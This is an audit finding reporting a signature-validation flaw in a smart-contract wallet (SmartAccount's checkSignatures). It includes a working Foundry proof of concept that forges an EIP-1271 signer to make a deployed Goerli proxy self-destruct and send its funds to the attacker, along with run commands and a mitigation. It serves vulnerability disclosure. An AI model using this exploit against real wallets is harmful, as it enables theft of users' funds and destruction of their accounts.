[H-04] Arbitrary transactions possible due to insufficient signature validation
Submitted by0xdeadbeef0x, also found byV_B,gogo,gogo,Fon,adriro,Tricko,immeas,Haipls,ayeslick,wait,Lirios,Koolex,Atarpara,bin2chen,hihen,ast3ros,wallstreetvilkas,romand,ladboy233,ro,BClabs,StErMi,static,Manboy,csanuragjain, andkankodu
A hacker can create arbitrary transaction through the smart wallet by evading signature validation.
Major impacts:
Stealallfunds from the smart wallet and destroy the proxyLock the wallet from EOAs by updating the implementation contractNew implementation can transfer all funds or hold some kind of ransomNew implementation can take time to unstake funds from protocols
Proof of Concept
The protocol supports contract signed transactions (eip-1271). The support is implemented in thecheckSignaturecall when providing a transaction:contracts/smart-contract-wallet/SmartAccount.sol#L218contracts/smart-contract-wallet/SmartAccount.sol#L342
function execTransaction(Transaction memory _tx,uint256 batchId,FeeRefund memory refundInfo,bytes memory signatures) public payable virtual override returns (bool success) {---------checkSignatures(txHash, txHashData, signatures);}---------success = execute(_tx.to, _tx.value, _tx.data, _tx.operation, refundInfo.gasPrice == 0 ? (gasleft() - 2500) : _tx.targetTxGas);---------}}function checkSignatures(bytes32 dataHash,bytes memory data,bytes memory signatures) public view virtual {----------if(v == 0) {----------_signer = address(uint160(uint256(r)));----------require(uint256(s) >= uint256(1) * 65, "BSA021");----------require(uint256(s) + 32 <= signatures.length, "BSA022");-----------assembly {contractSignatureLen := mload(add(add(signatures, s), 0x20))}require(uint256(s) + 32 + contractSignatureLen <= signatures.length, "BSA023");-----------require(ISignatureValidator(_signer).isValidSignature(data, contractSignature) == EIP1271_MAGIC_VALUE, "BSA024");-----------}
checkSignatureDOES NOTValidate that the_signeror caller is the owner of the contract.
A hacker can craft a signature that bypasses the signature structure requirements and sets a hacker controlled_signerthat always returnEIP1271_MAGIC_VALUEfrom theisValidSignaturefunction.
AsisValidSignaturereturnsEIP1271_MAGIC_VALUEand passed the requirements, the functioncheckSignaturesreturns gracefully and the transaction execution will continue. Arbitrary transactions can be set by the hacker.
Impact #1 - Self destruct and steal all funds
Consider the following scenario:
Hacker createsFakeSignerthat always returnsEIP1271_MAGIC_VALUEHacker createsSelfDestructingContractthatselfdestructs when calledHacker calls the smart walletsexecTransactionfunctionThe transaction set will delegatecall to theSelfDestructingContractfunction toselfdestructThe signature is crafted to validate against hacker controlledFakeSignerthat always returnsEIP1271_MAGIC_VALUEProxy contract is destroyedHacker received all funds that were in the wallet
Impact #2 - Update implementation and lock out EOA
Hacker createsFakeSignerthat always returnsEIP1271_MAGIC_VALUEHacker createsMaliciousImplementationthat is fully controlledONLYby the hackerHacker calls the smart walletsexecTransactionfunctionThe transaction set will call to the the contractsupdateImplementationfunction to update the implementation toMaliciousImplementation. This is possible becauseupdateImplementationpermits being called fromaddress(this)The signature is crafted to validate against hacker controlledFakeSignerthat always returnsEIP1271_MAGIC_VALUEImplementation was updated toMaliciousImplementationHacker transfers all native and ERC20 tokens to himselfHacker unstakes EOA funds from protocolsHacker might try to ransom the protocol/EOAs to return to previous implementationProxy cannot be redeployed for the existing EOA
Foundry POC
The POC will demonstrate impact #1. It will show that the proxy does not exist after the attack and EOAs cannot interact with the wallet.
The POC was built using the Foundry framework which allowed me to validate the vulnerability against the state of deployed contract on goerli (Without interacting with them directly). This was approved by the sponsor.
The POC use a smart wallet proxy contract that is deployed ongoerlichain:proxy: 0x11dc228AB5BA253Acb58245E10ff129a6f281b09
You will need to install a foundry. Please follow these instruction for the setup:https://book.getfoundry.sh/getting-started/installation
After installing, create a workdir by issuing the command:forge init --no-commit
Create the following file intest/DestroyWalletAndStealFunds.t.sol:
// SPDX-License-Identifier: UNLICENSEDpragma solidity ^0.8.13;import "forge-std/Test.sol";contract Enum {enum Operation {Call, DelegateCall}}interface SmartAccount {function execTransaction(Transaction memory _tx,uint256 batchId,FeeRefund memory refundInfo,bytes memory signatures) external payable returns (bool success);function getNonce(uint256 batchId) external view returns (uint256);}struct Transaction {address to;uint256 value;bytes data;Enum.Operation operation;uint256 targetTxGas;}struct FeeRefund {uint256 baseGas;uint256 gasPrice; //gasPrice or tokenGasPriceuint256 tokenGasPriceFactor;address gasToken;address payable refundReceiver;}contract FakeSigner {bytes4 internal constant EIP1271_MAGIC_VALUE = 0x20c13b0b;// Always return valid EIP1271_MAGIC_VALUEfunction isValidSignature(bytes memory data, bytes memory contractSignature) external returns (bytes4) {return EIP1271_MAGIC_VALUE;}}contract SelfDestructingContract {// All this does is self destruct and send funds to "to"function selfDestruct(address to) external {selfdestruct(payable(to));}}contract DestroyWalletAndStealFunds is Test {SmartAccount proxySmartAccount = SmartAccount(0x11dc228AB5BA253Acb58245E10ff129a6f281b09);address hacker = vm.addr(0x1337);SelfDestructingContract sdc;FakeSigner fs;function setUp() public {// Create self destruct contractsdc = new SelfDestructingContract();// Create fake signerfs = new FakeSigner();// Impersonate hackervm.startPrank(hacker);// Create the calldata to call the selfDestruct function of SelfDestructingContract and send funds to hackerbytes memory data = abi.encodeWithSelector(sdc.selfDestruct.selector, hacker);// Create transaction specifing SelfDestructingContract as target and as a delegate callTransaction memory transaction = Transaction(address(sdc), 0, data, Enum.Operation.DelegateCall, 1000000);// Create FeeRefundFeeRefund memory fr = FeeRefund(100, 100, 100, hacker, payable(hacker));bytes32 fakeSignerPadded = bytes32(uint256(uint160(address(fs))));// Add fake signature (r,s,v) to pass all requirments.// v=0 to indicate eip-1271 signer "fakeSignerPadded" which will always return truebytes memory signatures = abi.encodePacked(fakeSignerPadded, bytes32(uint256(65)),uint8(0), bytes32(0x0));// Call execTransaction with eip-1271 signer to delegatecall to selfdestruct of the proxy contract.proxySmartAccount.execTransaction(transaction, 0, fr, signatures);vm.stopPrank();}function testProxyDoesNotExist() public {uint size;// Validate that bytecode size of the proxy contract is 0 becuase of self destructaddress proxy = address(proxySmartAccount);assembly {size := extcodesize(proxy)}assertEq(size,0);}function testRevertWhenCallingWalletThroughProxy() public {// Revert when trying to call a function in the proxyproxySmartAccount.getNonce(0);}}
To run the POC and validate that the proxy does not exist after destruction:
forge test -m testProxyDoesNotExist -v --fork-url="<GOERLI FORK RPC>"
Expected output:
Running 1 test for test/DestroyWalletAndStealFunds.t.sol:DestroyWalletAndStealFunds[PASS] testProxyDoesNotExist() (gas: 4976)Test result: ok. 1 passed; 0 failed; finished in 4.51s
To run the POC and validate that the EOA cannot interact with the wallet after destruction:
forge test -m testRevertWhenCallingWalletThroughProxy -v --fork-url="<GOERLI FORK RPC>"
Expected output:
Failing tests:Encountered 1 failing test in test/DestroyWalletAndStealFunds.t.sol:DestroyWalletAndStealFunds[FAIL. Reason: EvmError: Revert] testRevertWhenCallingWalletThroughProxy() (gas: 5092)
Tools Used
Foundry, VS Code
Recommended Mitigation Steps
The protocol should validate before callingisValidSignaturethat_signerisowner.
livingrockrises (Biconomy) confirmed